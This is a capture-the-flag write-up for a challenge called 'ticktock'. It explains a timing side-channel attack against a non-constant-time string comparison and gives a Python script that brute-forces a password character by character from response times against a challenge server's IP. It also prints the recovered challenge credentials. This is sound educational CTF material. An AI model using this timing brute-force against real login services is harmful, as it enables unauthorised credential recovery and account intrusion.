# ticktock
by Halogen
> Problem Description
## Solution
This had 0 solves until the admin dropped their insane hint
![hint.png|center](./assets/hint.png)
<center>🙏 Thank you @bbbb 🙏</center>

So after being given the compare string code, Woah! Look at all the asyncio.sleep. Wonder if we could exploit that?🤔oh we could, with a side channel attack called timing attack!

The idea is we brute force our admin and password smartly, by checking the time it took to process our wrong username/password. First we brute force the length of the string, then each individual character, starting from the front.

**Sample Script (for `pwd`)**
```python
# Answers to find
usr = "0p3nr4leaf"
pwd = "r1g3boj8455871326i3w"

# Imports
import string, requests

i = 0
while i != len(pwd):

	# Keep a list of timings for each character
	result = []

	# For each character
	for c in string.ascii_lowercase + string.digits:

		# Sub it in and check timing
		r = requests.get(f"http://157.245.52.169:31662/flag?username={usr}&password={pwd[:i] + c + pwd[i+1:]}")

		# Add it to timings
		result.append((r.elapsed.total_seconds(), c))

	# Sort by timing
	result.sort()
	
	# Gets the character (slowest character)
	ans = result[-1]
	pwd = pwd[:i] + ans[1] + pwd[i+1:]

	# Slowly Print out answer
	print(pwd)
	i += 1
```

After using the given username and password we get the flag